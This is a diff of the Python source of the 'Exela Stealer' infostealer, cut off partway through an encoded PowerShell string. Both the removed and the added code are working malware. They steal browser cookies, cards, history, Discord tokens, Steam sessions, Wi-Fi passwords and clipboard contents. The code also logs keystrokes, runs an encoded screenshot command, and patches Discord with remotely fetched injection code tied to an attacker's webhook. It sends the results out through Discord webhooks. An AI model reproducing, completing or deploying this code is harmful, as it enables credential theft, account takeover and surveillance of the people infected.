-            os.mkdir(tmp + f"\\{run}\\Cards")
-            with open(tmp + f"\\{run}\\Cards\\Cards.txt", "a", encoding="utf-8", errors="ingore") as x:
-                x.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                for uknowwhatiscc in self.card_list:
-                    x.write(str(uknowwhatiscc) + "\n")
-        if self.cookie_list:
-            os.mkdir(tmp + f"\\{run}\\Cookies")
-            with open(tmp + f"\\{run}\\Cookies\\Cookies.txt", "a", encoding="utf-8", errors="ingore") as c:
-                c.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                for allCookies in self.cookie_list:
-                    c.write(str(allCookies) + "\n")
-        if self.downloads_list:
-            os.mkdir(tmp + f"\\{run}\\Downloads")
-            with open(tmp + f"\\{run}\\Downloads\\Downloads.txt", "a", encoding="utf-8", errors="ingore") as d:
-                d.write("----------------------https://t.me/ExelaStealer----------------------\n" + "=" * 70 + "\n")
-                for dwnlds in self.downloads_list:
-                    d.write(str(dwnlds) + "\n")
-        if self.history_list:
-            os.mkdir(tmp + f"\\{run}\\Historys")
-            with open(tmp + f"\\{run}\\Historys\\Historys.txt", "a", encoding="utf-8", errors="ingore") as q:
-                q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                for date in self.history_list:
-                    q.write(str(date) + "\n")
-        if self.mozilla_history:
-            try:
-                os.mkdir(tmp + f"\\{run}\\Firefox")
-            except:
-                pass
-            with open(tmp + f"\\{run}\\Firefox\\History.txt", "a", encoding="utf-8", errors="ingore") as q:
-                q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                for date in self.mozilla_history:
-                    q.write(str(date) + "\n")
-        if self.mozilla_cookie:
-            try:
-                os.mkdir(tmp + f"\\{run}\\Firefox")
-            except:
-                pass
-            with open(tmp + f"\\{run}\\Firefox\\Cookies.txt", "a", encoding="utf-8", errors="ingore") as q:
-                q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                for date in self.mozilla_cookie:
-                    q.write(str(date) + "\n")
-        if self.instagram_account_list:
-            os.mkdir(tmp + f"\\{run}\\Instagram")
-            with open(tmp + f"\\{run}\\Instagram\\instagram.txt", "a", encoding="utf-8", errors="ingore") as q:
-                q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                for ii in self.instagram_account_list:
-                    q.write(str(ii) + "\n")
-        if self.twitter_account_list:
-            os.mkdir(tmp + f"\\{run}\\Twitter")
-            with open(tmp + f"\\{run}\\Twitter\\Twitter.txt", "a", encoding="utf-8", errors="ingore") as q:
-                q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                for tt in self.twitter_account_list:
-                    q.write(str(tt) + "\n")
-        if self.tiktok_account_list:
-            os.mkdir(tmp + f"\\{run}\\Tiktok")
-            with open(tmp + f"\\{run}\\Tiktok\\Tiktok.txt", "a", encoding="utf-8", errors="ingore") as q:
-                q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                for ti in self.tiktok_account_list:
-                    q.write(str(ti) + "\n")
-        if self.reddit_account_list:
-            os.mkdir(tmp + f"\\{run}\\Reddit")
-            with open(tmp + f"\\{run}\\Reddit\\Reddit.txt", "a", encoding="utf-8", errors="ingore") as q:
-                q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                for re in self.reddit_account_list:
-                    q.write(str(re) + "\n")
-        if self.fullTokens:
-            os.mkdir(tmp + f"\\{run}\\Tokens")
-            with open(tmp + f"\\{run}\\Tokens\\full_tokens.txt", "a", encoding="utf-8", errors="ingore") as q:
-                q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                for re in self.fullTokens:
-                    q.write(str(re) + "\n")
-        if self.validatedTokens:
-            with open(tmp + f"\\{run}\\Tokens\\validated_tokens.txt", "a", encoding="utf-8", errors="ingore") as q:
-                q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                for re in self.validatedTokens:
-                    q.write(str(re) + "\n")
-        if self.discrod:
-            with open(tmp + f"\\{run}\\Tokens\\discord_accounts.txt", "a", encoding="utf-8", errors="ingore") as q:
-                q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                for re in self.discordd:
-                    q.write(str(re) + "\n")
-        if self.steam_account_list:
-            os.mkdir(tmp + f"\\{run}\\Steam")
-            with open(tmp + f"\\{run}\\Steam\\Steam.txt", "a", encoding="utf-8", errors="ingore") as q:
-                q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                for st in self.steam_account_list:
-                    q.write(str(st) + "\n")
-        if self.roblox_account_list:
-            os.mkdir(tmp + f"\\{run}\\Roblox")
-            with open(tmp + f"\\{run}\\Roblox\\Roblox.txt", "a", encoding="utf-8", errors="ignore") as q:
-                q.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                for robl in self.roblox_account_list:
-                    q.write(str(robl))
-        if 5 < 10:
-            command = "JABzAG8AdQByAGMAZQAgAD0AIABAACIADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AQwBvAGwAbABlAGMAdABpAG8AbgBzAC4ARwBlAG4AZQByAGkAYwA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzADsADQAKAA0ACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFMAYwByAGUAZQBuAHMAaABvAHQADQAKAHsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAEwAaQBzAHQAPABCAGkAdABtAGEAcAA+ACAAQwBhAHAAdAB1AHIAZQBTAGMAcgBlAGUAbgBzACgAKQANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAdgBhAHIAIAByAGUAcwB1AGwAdABzACAAPQAgAG4AZQB3ACAATABpAHMAdAA8AEIAaQB0AG0AYQBwAD4AKAApADsADQAKACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGEAbABsAFMAYwByAGUAZQBuAHMAIAA9ACAAUwBjAHIAZQBlAG4ALgBBAGwAbABTAGMAcgBlAGUAbgBzADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAZgBvAHIAZQBhAGMAaAAgACgAUwBjAHIAZQBlAG4AIABzAGMAcgBlAGUAbgAgAGkAbgAgAGEAbABsAFMAYwByAGUAZQBuAHMAKQANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIAZQBjAHQAYQBuAGcAbABlACAAYgBvAHUAbgBkAHMAIAA9ACAAcwBjAHIAZQBlAG4ALgBCAG8AdQBuAGQAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHUAcwBpAG4AZwAgACgAQgBpAHQAbQBhAHAAIABiAGkAdABtAGEAcAAgAD0AIABuAGUAdwAgAEIAaQB0AG0AYQBwACgAYgBvAHUAbgBkAHMALgBXAGkAZAB0AGgALAAgAGIAbwB1AG4AZABzAC4ASABlAGkAZwBoAHQAKQApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AHMAaQBuAGcAIAAoAEcAcgBhAHAAaABpAGMAcwAgAGcAcgBhAHAAaABpAGMAcwAgAD0AIABHAHIAYQBwAGgAaQBjAHMALgBGAHIAbwBtAEkAbQBhAGcAZQAoAGIAaQB0AG0AYQBwACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGcAcgBhAHAAaABpAGMAcwAuAEMAbwBwAHkARgByAG8AbQBTAGMAcgBlAGUAbgAoAG4AZQB3ACAAUABvAGkAbgB0ACgAYgBvAHUAbgBkAHMALgBMAGUAZgB0ACwAIABiAG8AdQBuAGQAcwAuAFQAbwBwACkALAAgAFAAbwBpAG4AdAAuAEUAbQBwAHQAeQAsACAAYgBvAHUAbgBkAHMALgBTAGkAegBlACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHMAdQBsAHQAcwAuAEEAZABkACgAKABCAGkAdABtAGEAcAApAGIAaQB0AG0AYQBwAC4AQwBsAG8AbgBlACgAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC8ALwAgAEgAYQBuAGQAbABlACAAYQBuAHkAIABlAHgAYwBlAHAAdABpAG8AbgBzACAAaABlAHIAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAcgBlAHQAdQByAG4AIAByAGUAcwB1AGwAdABzADsADQAKACAAIAAgACAAfQANAAoAfQANAAoAIgBAAA0ACgANAAoAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAHMAbwB1AHIAYwBlACAALQBSAGUAZgBlAHIAZQBuAGMAZQBkAEEAcwBzAGUAbQBiAGwAaQBlAHMAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALAAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwANAAoADQAKACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzACAAPQAgAFsAUwBjAHIAZQBlAG4AcwBoAG8AdABdADoAOgBDAGEAcAB0AHUAcgBlAFMAYwByAGUAZQBuAHMAKAApAA0ACgANAAoADQAKAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQAcwAuAEMAbwB1AG4AdAA7ACAAJABpACsAKwApAHsADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0ACAAPQAgACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzAFsAJABpAF0ADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0AC4AUwBhAHYAZQAoACIALgAvAEQAaQBzAHAAbABhAHkAIAAoACQAKAAkAGkAKwAxACkAKQAuAHAAbgBnACIAKQANAAoAIAAgACAAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQALgBEAGkAcwBwAG8AcwBlACgAKQANAAoAfQA=" # Unicode encoded command
-            subprocess.run(["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-EncodedCommand", command], shell=True, capture_output=True, cwd= tmp + f"\\{run}")
-        if 0 < 1:
-            active_window_title = self.get_active_window_title()
-            with open(tmp + f"\\{run}\\active_window.txt", "a", encoding="utf-8", errors="ignore") as x:
-                x.write(str(active_window_title))
-        if 7<15:
-            try:
-                process = subprocess.run("tasklist /FO LIST", capture_output= True, shell= True)
-                output = process.stdout.decode(errors= "ignore").strip().replace("\r\n", "\n")
-                with open(tmp + f"\\{run}\\process_list.txt", "w",encoding="utf-8", errors="ignore") as process_list:
-                    process_list.write(output)
-            except:
-                pass
-        if 5 > 4:
-            self.get_last_clipboard_text(run)
-            self.get_last_clipboard_image(run)        
-        if 45 > 3:
-            self.get_all_system_data()
-        if 7855 < 8888:
-            self.GetWifiPasswords(tmp + f"\\{run}")
-        
-class DiscordInjection:
-    def __init__(self) -> None:
-        self.local_appdata = os.getenv("LOCALAPPDATA")
-        self.discord_path = os.path.join(self.local_appdata, "Discord")
-        if os.path.isdir(self.discord_path):
-            self.callBack()
-        else:return
-    def callBack(self):
-        if not self.isInjected():
-            self.kill_dc()
-            self.write_injection()
-            self.start_dc()
-    def find_index_path(self) -> str:
-        if not os.path.isdir(self.discord_path):
-            return
-        else:
-            for file in os.listdir(self.discord_path):
+            for file in os.listdir(path):
                 if re.search(r'app-+?', file):
-                    modules_dir = os.path.join(self.discord_path,file, "modules")
+                    modules_dir = os.path.join(path,file, "modules")
                     for modules_files in os.listdir(modules_dir):
                         if re.search(r'discord_desktop_core-+?', modules_files):
                             core_path = os.path.join(modules_dir, modules_files, "discord_desktop_core")
                             index_path = os.path.join(core_path, "index.js")
                             if os.path.isfile(index_path):
                                 return index_path
-    def get_injection_code(self) -> str:
-        code = requests.get("https://raw.githubusercontent.com/quicaxd/Exela-V2.0/main/injection/injection.js").text
-        replaced_code = code.replace("%WEBHOOK%",UrLxD)
-        return replaced_code
-    def isInjected(self) -> bool:
+        except:
+            return "Null"
+    async def KillDiscord(self) -> None:
         try:
-            file_path = self.find_index_path()
-            with open(file_path, "r", encoding="utf-8", errors="ignore") as lol:
-                if UrLxD in lol.read():
-                    return True
-                else:return False
-        except:return False
-    def write_injection(self):
-        file_path = self.find_index_path()
-        get_injection_code = self.get_injection_code()
-        with open(file_path, "w", encoding="utf-8", errors="ignore") as lol:
-            lol.write(get_injection_code)
-    def kill_dc(self):
-        for proc in psutil.process_iter():
-            if 'discord' in proc.name().lower():
-                proc.kill()
-    def start_dc(self):
-        command = os.path.join(self.discord_path, "Update.exe") + " --processStart Discord.exe"
-        subprocess.run(command, shell=True)   
-class KeyboardLogger:
-    def __init__(self, output_file, webhook_url) -> None:
-        self.output_file = output_file
-        self.caps_lock_active = False
-        self.total_keys = 0
-        self.webhook_url = webhook_url
-        self.running = True
-    def format_key(self, key):
-        if isinstance(key, keyboard.KeyCode):
-            return key.char if key.char else str(key.vk)
-        else:
-            return str(key)       
-    def on_key_press(self, key):
+            proc = await asyncio.create_subprocess_shell("tasklist | findstr /i discord", stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True)
+            stdout, stderr = await proc.communicate()
+            processes = stdout.decode(errors="ignore").split('\n')
+            for proc in processes:
+                if 'discord' in proc.lower():
+                    try:
+                        pid = int(proc.split()[1])
+                        kill_proc = await asyncio.create_subprocess_shell(f"taskkill /F /PID {pid}", shell=True,stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+                        await kill_proc.wait()
+                    except:
+                        pass
+        except:
+            pass
+    async def GetInjectionCode(self) -> str:
         try:
-            with open(self.output_file, 'a', encoding='utf-8', errors="ignore") as f:
-                if key == keyboard.Key.space:
-                    f.write(' ')
-                elif key == keyboard.Key.enter:
-                    f.write('\n')
-                elif key == keyboard.Key.caps_lock:
-                    self.caps_lock_active = not self.caps_lock_active
-                    if self.caps_lock_active:
-                        f.write('[caps_lock_on]')
-                    else:
-                        f.write('[caps_lock_off]')
-                elif key == keyboard.Key.f1:
-                    f.write('[F1]')
-                elif key == keyboard.Key.f2:
-                    f.write('[F2]')
-                elif key == keyboard.Key.f3:
-                    f.write('[F3]')
-                elif key == keyboard.Key.f4:
-                    f.write('[F4]')
-                elif key == keyboard.Key.f5:
-                    f.write('[F5]')
-                elif key == keyboard.Key.f6:
-                    f.write('[F6]')
-                elif key == keyboard.Key.f7:
-                    f.write('[F7]')
-                elif key == keyboard.Key.f8:
-                    f.write('[F8]')
-                elif key == keyboard.Key.f9:
-                    f.write('[F9]')
-                elif key == keyboard.Key.f10:
-                    f.write('[F10]')
-                elif key == keyboard.Key.f11:
-                    f.write('[F11]')
-                elif key == keyboard.Key.f12:
-                    f.write('[F12]')
-                elif key == keyboard.Key.home:
-                    f.write('[Home]')
-                elif key == keyboard.Key.end:
-                    f.write('[End]')
-                elif key == keyboard.Key.page_up:
-                    f.write('[PageUp]')
-                elif key == keyboard.Key.page_down:
-                    f.write('[PageDown]')
-                elif key == keyboard.Key.up:
-                    f.write(str('↑'))
-                elif key == keyboard.Key.down:
-                    f.write(str('↓'))
-                elif key == keyboard.Key.right:
-                    f.write(str('→'))
-                elif key == keyboard.Key.left:
-                    f.write(str('←'))
-                elif key == keyboard.Key.backspace:
-                    f.write("[back_space]")
-                elif key == keyboard.Key.esc:
-                    f.write("esc ")
+            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
+                async with session.get("https://raw.githubusercontent.com/quicaxd/Exela-V2.0/main/injection/injection.js") as response:
+                    data = await response.text()
+                    return data.replace("https://discord.com/api/webhooks/1154107526711885875/NiRTvgpX6duR7elXN25mcCV4SfUaxDq1Jm9YNXpkK42LGi9KbLKKeTaPeCu4gzqoCwlE", webhook)
+        except:
+            return "null"
+    async def GetSteamSession(self) -> None:
+        try:
+            all_disks = []
+            for drive in range(ord('A'), ord('Z')+1):
+                drive_letter = chr(drive)
+                if os.path.exists(drive_letter + ':\\'):
+                    all_disks.append(drive_letter)
+            for steam_paths in all_disks:
+                if "64" in platform.architecture()[0]:
+                    steam_paths = os.path.join(steam_paths + ":\\", "Program Files (x86)", "Steam", "config", "loginusers.vdf")
                 else:
-                    char = self.format_key(key).upper() if self.caps_lock_active else self.format_key(key).lower()
-                    f.write(f'{char}')
-                    self.total_keys += 1  
-                    if self.total_keys >= 300:
-                        self.send_webhook()
-        except AttributeError:
-            with open(self.output_file, 'a', encoding='utf-8', errors="ignore") as f:
-                if key == keyboard.Key.space:
-                    f.write(' ')
-                elif key == keyboard.Key.enter:
-                    f.write('\n')
-                elif key == keyboard.Key.caps_lock:
-                    self.caps_lock_active = not self.caps_lock_active
-                    if self.caps_lock_active:
-                        f.write('[caps_lock_on]')
-                    else:
-                        f.write('[caps_lock_off]')
-                elif key == keyboard.Key.f1:
-                    f.write('[F1]')
-                elif key == keyboard.Key.f2:
-                    f.write('[F2]')
-                elif key == keyboard.Key.f3:
-                    f.write('[F3]')
-                elif key == keyboard.Key.f4:
-                    f.write('[F4]')
-                elif key == keyboard.Key.f5:
-                    f.write('[F5]')
-                elif key == keyboard.Key.f6:
-                    f.write('[F6]')
-                elif key == keyboard.Key.f7:
-                    f.write('[F7]')
-                elif key == keyboard.Key.f8:
-                    f.write('[F8]')
-                elif key == keyboard.Key.f9:
-                    f.write('[F9]')
-                elif key == keyboard.Key.f10:
-                    f.write('[F10]')
-                elif key == keyboard.Key.f11:
-                    f.write('[F11]')
-                elif key == keyboard.Key.f12:
-                    f.write('[F12]')
-                elif key == keyboard.Key.home:
-                    f.write('[Home]')
-                elif key == keyboard.Key.end:
-                    f.write('[End]')
-                elif key == keyboard.Key.page_up:
-                    f.write('[PageUp]')
-                elif key == keyboard.Key.page_down:
-                    f.write('[PageDown]')
-                elif key == keyboard.Key.up:
-                    f.write(str('↑'))
-                elif key == keyboard.Key.down:
-                    f.write(str('↓'))
-                elif key == keyboard.Key.right:
-                    f.write(str('→'))
-                elif key == keyboard.Key.left:
-                    f.write(str('←'))
-                elif key == keyboard.Key.backspace:
-                    f.write("[back_space]")
-                elif key == keyboard.Key.esc:
-                    f.write("esc ")
-                else:
-                    char = self.format_key(key).upper() if self.caps_lock_active else self.format_key(key).lower()
-                    f.write(f'{char}')
-                    
-                    self.total_keys += 1  # Tuş sayısını artır
+                    steam_paths = os.path.join(steam_paths + ":\\", "Program Files", "Steam", "config", "loginusers.vdf")
+                if os.path.isfile(steam_paths):
+                    with open(steam_paths, "r", encoding="utf-8", errors="ignore") as file:
+                        steamid = "".join(re.findall(r"7656[0-9]{13}", file.read()))
+                        if steamid:
+                            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
+                                url = "https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=440D7F4D810EF9298D25EDDF37C1F902&steamids=" + steamid
+                                url2 = "https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=" + steamid
+                                url3 = "https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=" + steamid
+                                urls = [url, url2, url3]
+                                tasks = []
+                                for url in urls:
+                                    tasks.append(self.fetch_url(session, url))
+                                responses = await asyncio.gather(*tasks)
+                                for response in responses:
+                                    if "steamid" in response:
+                                        response = json.loads(response)
+                                        player_data = response["response"]["players"][0]
+                                        personname = player_data["personaname"]
+                                        profileurl = player_data["profileurl"]
+                                        avatar = player_data["avatarfull"]
+                                        if player_data["realname"]:
+                                            realname = player_data["realname"]
+                                        else:realname = "None"
+                                        timecreated = player_data["timecreated"]
+                                    if "player_level" in response:
+                                        response = json.loads(response)
+                                        player_level = response["response"]["player_level"]
+                                    if "game_count" in response:
+                                        response = json.loads(response)
+                                        game_count = response["response"]["game_count"]
+                                    if not "game_count" in response:
+                                        game_count = "0"
+                                embed_data = {
+                                    "title": "***Exela Stealer***",
+                                    "description": f"***Exela Steam Session Detected***",
+                                    "url" : "https://github.com/quicaxd",
+                                    "color": 0,
+                                    "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd"},
+                                    "thumbnail": {"url": avatar}}
+                                fields = [
+                                        {"name": "Username", "value": "``" + str(personname) + "``", "inline": True},
+                                        {"name": "Realname", "value": "``" + str(realname) + "``", "inline": True},
+                                        {"name": "ID", "value": "``" +  str(steamid) + "``", "inline": True},
+                                        {"name": "Timecreated", "value": "``" + str(timecreated) + "``", "inline": True},
+                                        {"name": "Player Level", "value":"``" + str(player_level) + "``", "inline": True},
+                                        {"name": "Game Count", "value":"``" + str(game_count) + "``", "inline": True},
+                                        {"name": "Profile URL", "value": "``" + str(profileurl) + "``", "inline": False},]
+                                embed_data["fields"] = fields
+                                async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
+                                    payload = {
+                                        "username": "Exela Stealer",
+                                        "embeds": [embed_data]
+                                    }
+                                    headers = {
+                                        "Content-Type": "application/json"
+                                    }
+                                    async with session.post(webhook, json=payload, headers=headers) as response:
+                                        pass
+                                self.steamSessionList.append(f"Username : {personname}\nRealname : {realname}\nID : {steamid}\nTimecreated : {timecreated}\nProfile URL : {profileurl}\n======================================================================\n")
 
-                    # Kontrol ve gönderme işlemi
-                    if self.total_keys >= 300:
-                        self.send_webhook()
-    def send_webhook(self):
-        print("sendings")
-        if os.path.exists(self.output_file) and self.total_keys >= 300:
-            with open(self.output_file, 'r',encoding="utf-8", errors="ignore") as file:
+        except:
+            pass            
+    async def fetch_url(self,session, url) -> str:
+        try:
+            async with session.get(url) as response:
+                return await response.text()
+        except:return "null"
+    async def ExrtactWifiPasswords(self) -> None:
+        try:
+            result = await asyncio.create_subprocess_shell('chcp', stdout=asyncio.subprocess.PIPE, shell=True) # get current system encoding
+            stdout, _ = await result.communicate()
+            current_code_page = stdout.decode(errors="ignore").split(":")[1].strip()
+
+            result = await asyncio.create_subprocess_shell(
+                f'netsh wlan show profiles',
+                stdout=asyncio.subprocess.PIPE,
+                shell=True,
+            )
+            stdout, _ = await result.communicate()
+            try:
+                decoded_name = stdout.decode(current_code_page)
+            except:decoded_name = stdout.decode("utf-8")
+            wifi_profile_names = re.findall(r'All User Profile\s*: (.*)', decoded_name)
+            for profile_name in wifi_profile_names:
+                result = await asyncio.create_subprocess_shell(
+                    f'netsh wlan show profile name="{profile_name}" key=clear',
+                    stdout=asyncio.subprocess.PIPE,
+                    shell=True,
+                    encoding=None
+                )
+                stdout, _ = await result.communicate()
+                try:
+                    profile_output = stdout.decode(current_code_page)
+                except:profile_output = stdout.decode("utf-8")
+                password_match = re.search(r'Key content\s*: (.*)', profile_output, re.IGNORECASE)
+                self.wifiList.append((profile_name, password_match.group(1) if password_match else "No password found"))
+        except:
+            pass
+    async def GetSystemInfo(self) -> None:
+        try:
+            result = await asyncio.create_subprocess_shell('chcp', stdout=asyncio.subprocess.PIPE, shell=True)
+            stdout, _ = await result.communicate()
+            current_code_page = stdout.decode().split(":")[1].strip()
+            result = await asyncio.create_subprocess_shell('echo ####System Info#### & systeminfo & echo ####System Version#### & ver & echo ####Host Name#### & hostname & echo ####Environment Variable#### & set & echo ####Logical Disk#### & wmic logicaldisk get caption,description,providername & echo ####User Info#### & net user & echo ####Local Group#### & net localgroup & echo ####Administrators Info#### & net localgroup administrators & echo ####Guest User Info#### & net user guest & echo ####Administrator User Info#### & net user administrator & echo ####Startup Info#### & wmic startup get caption,command & echo ####Tasklist#### & tasklist /svc & echo ####Ipconfig#### & ipconfig/all & echo ####Hosts#### & type C:\WINDOWS\System32\drivers\etc\hosts & echo ####Route Table#### & route print & echo ####Arp Info#### & arp -a & echo ####Netstat#### & netstat -ano & echo ####Service Info#### & sc query type= service state= all & echo ####Firewallinfo#### & netsh firewall show state & netsh firewall show config', stdout=asyncio.subprocess.PIPE, shell=True)
+            stdout, _ = await result.communicate()
+            self.systeminfoList.append(stdout.decode(current_code_page))
+        except Exception as e:
+            os.system("cls")
+            print(e)
+    async def GetNetworkInfo(self) -> None:
+        try:    
+            async with aiohttp.ClientSession() as session:
+                async with session.get("http://ip-api.com/json") as response:
+                    data = await response.json()
+                    ip = data["query"]
+                    country = data["country"]
+                    city = data["city"]
+                    timezone = data["timezone"]
+                    isp_info = data["isp"] + f" {data['org']} {data['as']}"
+                    self.NetworkList.append((ip, country, city, timezone, isp_info))
+        except Exception as e:
+            print(str(e))
+    async def GetProcessINfo(self) -> None:
+        try:
+            process = await asyncio.create_subprocess_shell(
+                "tasklist /FO LIST",
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+                shell=True
+            )
+            stdout, stderr = await process.communicate()
+            self.processList.append(stdout.decode())
+        except:pass
+    async def GetLastClipboard(self) -> None:
+        try:
+            process = await asyncio.create_subprocess_shell(
+                "powershell.exe Get-Clipboard",
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+                shell=True
+            )
+            stdout, stderr = await process.communicate()
+            if stdout:
+                self.lastCipboardList.append(stdout.decode(errors="ignore"))
+        except:
+            pass
+    async def WriteToText(self) -> None:
+        try:
+            cmd = "wmic csproduct get uuid"
+            process = await asyncio.create_subprocess_shell(
+                cmd,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+                shell=True
+            )
+            
+            stdout, stderr = await process.communicate()
+            output_lines = stdout.decode(errors="ignore").split("\n")
+            uuid = output_lines[1].strip() if len(output_lines) > 1 else None
+            filePath = os.path.join(self.Temp, uuid)
+            if os.path.isdir(filePath):
+                shutil.rmtree(filePath)
+            os.mkdir(filePath)
+            await self.GetWallets(filePath)
+            os.mkdir(os.path.join(filePath, "Browsers"))
+            os.mkdir(os.path.join(filePath, "Sessions"))
+            os.mkdir(os.path.join(filePath, "Tokens"))
+            if self.FireFox:
+                os.mkdir(os.path.join(filePath, "Browsers", "Firefox"))
+            command = "JABzAG8AdQByAGMAZQAgAD0AIABAACIADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AQwBvAGwAbABlAGMAdABpAG8AbgBzAC4ARwBlAG4AZQByAGkAYwA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzADsADQAKAA0ACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFMAYwByAGUAZQBuAHMAaABvAHQADQAKAHsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAEwAaQBzAHQAPABCAGkAdABtAGEAcAA+ACAAQwBhAHAAdAB1AHIAZQBTAGMAcgBlAGUAbgBzACgAKQANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAdgBhAHIAIAByAGUAcwB1AGwAdABzACAAPQAgAG4AZQB3ACAATABpAHMAdAA8AEIAaQB0AG0AYQBwAD4AKAApADsADQAKACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGEAbABsAFMAYwByAGUAZQBuAHMAIAA9ACAAUwBjAHIAZQBlAG4ALgBBAGwAbABTAGMAcgBlAGUAbgBzADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAZgBvAHIAZQBhAGMAaAAgACgAUwBjAHIAZQBlAG4AIABzAGMAcgBlAGUAbgAgAGkAbgAgAGEAbABsAFMAYwByAGUAZQBuAHMAKQANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIAZQBjAHQAYQBuAGcAbABlACAAYgBvAHUAbgBkAHMAIAA9ACAAcwBjAHIAZQBlAG4ALgB